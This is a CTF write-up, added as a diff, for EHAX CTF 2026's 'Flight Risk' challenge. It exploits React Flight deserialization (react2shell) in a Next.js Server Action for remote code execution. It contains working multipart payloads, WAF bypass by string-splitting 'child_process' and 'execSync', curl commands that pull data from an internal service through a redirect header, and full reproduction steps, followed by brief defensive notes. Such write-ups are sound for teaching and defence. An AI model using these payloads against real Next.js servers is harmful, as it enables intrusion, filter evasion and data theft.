@@ -1,0 +1,276 @@
+---
+title: 'EHAX CTF 2026 - Flight Risk (Web)'
+description: 'Writeup for Flight Risk from EHAX CTF 2026. A web challenge demonstrating React Flight deserialization (react2shell) and bypassing a WAF for RCE on a Next.js application.'
+date: 2026-03-02
+tags: ['writeup', 'web', 'ehax', 'react2shell', 'nextjs', 'deserialization']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Overview
+
+**Category:** Web
+**Target:** `http://chall.ehax.in:4269/`
+
+**TL;DR:** The app is a Next.js deployment with a reachable Server Action endpoint. It is vulnerable to a React Flight deserialization chain (a `react2shell` style exploit), allowing attacker-controlled `_prefix` JavaScript execution on the server. A WAF blocks obvious `child_process`/`execSync` strings, but simple string-splitting bypasses it.
+
+Using the resulting Remote Code Execution (RCE), we enumerated files, found an internal vault hint (`/app/vault.hint` pointing to `internal-vault:9009`), queried the internal service via SSRF-style command execution, and retrieved the flag.
+
+## 1. Initial Recon
+
+The local challenge environment folder only contained a `README.md`, which pointed to the target deployment: `http://chall.ehax.in:4269/`.
+
+The web application itself appeared extremely minimal on the surface, but the HTTP response headers returned by the Next.js server exposed that React Server Components (RSC) and Server Actions were actively in use.
+
+## 2. Identifying a Working Server Action
+
+During interaction with the app, a valid server action ID was discovered:
+
+```text
+7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd
+```
+
+Sending a direct POST request to `/` with the appropriate RSC headers confirmed the endpoint works as expected:
+
+```bash
+curl -sS -i 'http://chall.ehax.in:4269/' -X POST \
+  -H 'Accept: text/x-component' \
+  -H 'Next-Action: 7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd' \
+  -H 'Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D' \
+  --data-urlencode '1_name=test' \
+  --data-urlencode '0=["$K1"]'
+```
+
+**Response:**
+
+```http
+HTTP/1.1 200 OK
+Content-Type: text/x-component
+...
+1:{"success":"Access Granted. Welcome to the mainframe, test."}
+```
+
+This confirmed:
+1. Server Actions are enabled and reachable.
+2. Action parsing accepts attacker-controlled RSC model data.
+
+## 3. The Hypothesis: React2Shell
+
+This target effectively matched classic preconditions for a React Server Components deserialization attack:
+- A Next.js Server Action endpoint is reachable from an unauthenticated context.
+- RSC payload parser behavior is exposed by the `text/x-component` response.
+- Flight model fields (`$...` references) are accepted in the request body.
+
+A safe probe using a known `react2shell` side-channel payload shape produced a controlled `500` digest. This indicated the vulnerable parser path was successfully hit.
+
+## 4. Confirming the Server-Side JavaScript Execution Primitive
+
+By sending a raw multipart Flight body (instead of URL-encoded action arguments) with a malicious `_prefix`, we produced server-controlled redirect headers.
+
+### 4.1 Minimal execution proof payload
+
+We crafted `/tmp/r2s_body_safe.txt`:
+
+```http
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"throw Object.assign(new Error(\"NEXT_REDIRECT\"),{digest:\"NEXT_REDIRECT;push;/login?a=11111;307;\"});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+```
+
+And fired it:
+
+```bash
+curl -sS -i 'http://chall.ehax.in:4269/' -X POST \
+  -H 'Next-Action: x' \
+  -H 'X-Nextjs-Request-Id: b5dce965' \
+  -H 'X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9' \
+  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad' \
+  --data-binary @/tmp/r2s_body_safe.txt
+```
+
+**Observation:**
+
+```http
+HTTP/1.1 303 See Other
+x-action-redirect: /login?a=11111;push
+```
+
+That proves we can influence the server execution flow through `_prefix`.
+
+### 4.2 Direct runtime object test
+
+Using `_prefix` with `typeof process` returned:
+
+```http
+x-action-redirect: /login?a=object;push
+```
+
+This explicitly confirmed Node runtime object access right from our payload execution context.
+
+## 5. WAF Behavior and Bypass
+
+Naive RCE payloads containing obvious strings such as `child_process`, `execSync`, or the literal internal URL text triggered a WAF block:
+
+```http
+HTTP/1.1 403 Forbidden
+{"error":"WAF Alert: Malicious payload detected."}
+```
+
+### 5.1 Bypass strategy
+
+Standard string-fragment obfuscation was sufficient to slip past the WAF:
+- `"ch" + "ild_pro" + "cess"`
+- `"ex" + "ecS" + "ync"`
+
+Our validation payload looked like this:
+
+```javascript
+var m="ch"+"ild_pro"+"cess";
+var cp=process.mainModule.require(m);
+var f="ex"+"ecS"+"ync";
+var res=cp[f]("echo $((41*271))").toString().trim();
+throw Object.assign(new Error("NEXT_REDIRECT"),{digest:"NEXT_REDIRECT;push;/login?a="+res+";307;"});
+```
+
+**Result:**
+
+```http
+x-action-redirect: /login?a=11111;push
+```
+
+RCE was confirmed, bypassing the WAF.
+
+## 6. Post-Exploitation Enumeration
+
+Since command execution worked natively, we utilized arbitrary file reads and command output exfiltration via the `x-action-redirect` header constraint.
+
+### 6.1 Enumerate Root and App Directories
+
+Using `fs.readdirSync` via `_prefix`:
+- `/` contained standard container directories.
+- `/app` revealed `.next`, `node_modules`, `package.json`, `server.js`, and `vault.hint`.
+
+### 6.2 Read Hint File
+
+Reading `/app/vault.hint` via `fs.readFileSync` yielded an interesting exfiltration result:
+
+```http
+x-action-redirect: /login?a=internal-vault:9009;push
+```
+
+This indicated an internal service network pivot was necessary to capture the flag.
+
+## 7. Internal Pivot to the Vault Service
+
+Directly calling the internal service from payload command execution:
+
+```javascript
+var c="cu"+"rl -s http://in"+"ternal-va"+"ult:9009/";
+var res=cp[f](c).toString().trim();
+```
+
+This returned an HTML directory listing explicitly showing `flag.txt`. 
+
+Then, fetching the flag file itself:
+
+```javascript
+var c="cu"+"rl -s http://in"+"ternal-va"+"ult:9009/fl"+"ag.txt";
+var res=cp[f](c).toString().trim();
+```
+
+**Final Exfiltration Header:**
+
+```http
+x-action-redirect: /login?a=EHAX%7B1_m0r3_r34s0n_t0_us3_4ngu14r%7D;push
+```
+
+Decoding the URL-encoded string gave us our flag.
+
+## 8. Complete Repro Commands
+
+Below is a practical minimal sequence to replicate the attack from start to finish.
+
+### Step A: Prove Gadget Execution
+
+```bash
+cat >/tmp/r2s_exec_check.txt <<'EOF2'
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"throw Object.assign(new Error(\"NEXT_REDIRECT\"),{digest:\"NEXT_REDIRECT;push;/login?a=11111;307;\"});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+EOF2
+
+curl -sS -i 'http://chall.ehax.in:4269/' -X POST \
+  -H 'Next-Action: x' \
+  -H 'X-Nextjs-Request-Id: b5dce965' \
+  -H 'X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9' \
+  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad' \
+  --data-binary @/tmp/r2s_exec_check.txt
+```
+
+### Step B: Extract Flag from Internal Vault
+
+```bash
+cat >/tmp/r2s_get_flag.txt <<'EOF2'
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var m=\"ch\"+\"ild_pro\"+\"cess\";var cp=process.mainModule.require(m);var f=\"ex\"+\"ecS\"+\"ync\";var c=\"cu\"+\"rl -s http://in\"+\"ternal-va\"+\"ult:9009/fl\"+\"ag.txt\";var res=cp[f](c).toString().trim();throw Object.assign(new Error(\"NEXT_REDIRECT\"),{digest:\"NEXT_REDIRECT;push;/login?a=\"+encodeURIComponent(res)+\";307;\"});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+EOF2
+
+curl -sS -i 'http://chall.ehax.in:4269/' -X POST \
+  -H 'Next-Action: x' \
+  -H 'X-Nextjs-Request-Id: b5dce965' \
+  -H 'X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9' \
+  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad' \
+  --data-binary @/tmp/r2s_get_flag.txt
+```
+
+Look for the `x-action-redirect` header and URL-decode the `a=` value.
+
+## 9. Root Cause Summary
+
+The server inadvertently accepts attacker-controlled React Flight multipart models running within a Server Action context. It processes them up to a deserialization and code-path vulnerability, which cleanly evaluates controllable function-like structures natively (the `react2shell` chaining attack). This enables wide-open server-side Javascript execution right within the Node process scope.
+
+The WAF that sat in front of the process strictly applied static signature checks and plain-text string matches. Straightforward obfuscation easily bypassed its limitations.
+
+## 10. Defensive Notes
+
+- Patch Next.js/React runtimes to versions that resolve components vulnerable to React2Shell-related deserialization.
+- Disable or stringently gate exposed Server Actions if they are unused.
+- Treat Web Application Firewalls (WAFs) as defense-in-depth components rather than complete mitigations; signature-only filters are easy to circumvent.
+- Adhere strictly to the principle of least privilege, blocking cross-talk inside Docker networks natively. Restrict egress and internal service access from web containers (`internal-vault:9009` functionally should not be publicly reachable from the frontend runtime!).
+
+## Final Flag
+
+```text
+EHAX{1_m0r3_r34s0n_t0_us3_4ngu14r}
+```
